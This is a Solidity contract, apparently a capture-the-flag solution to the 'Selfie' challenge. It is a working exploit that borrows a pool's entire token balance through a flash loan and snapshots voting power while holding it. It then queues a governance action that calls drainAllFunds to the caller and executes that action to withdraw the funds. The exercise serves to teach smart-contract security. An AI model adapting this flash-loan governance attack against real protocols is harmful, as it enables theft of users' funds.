// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfieAttacker {
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableTokenSnapshot token;

    constructor(
        address _governanceAddress,
        address _poolAddress,
        address _tokenAddress
    ) {
        governance = SimpleGovernance(_governanceAddress);
        pool = SelfiePool(_poolAddress);
        token = DamnValuableTokenSnapshot(_tokenAddress);
    }

    function receiveTokens(address _token, uint256 _amount) external {
        token.snapshot();
        token.transfer(address(pool), _amount);
    }

    function proposeAction() public {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            msg.sender
        );
        governance.queueAction(address(pool), data, 0);
    }

    function withdraw() public {
        governance.executeAction(1);
    }
}
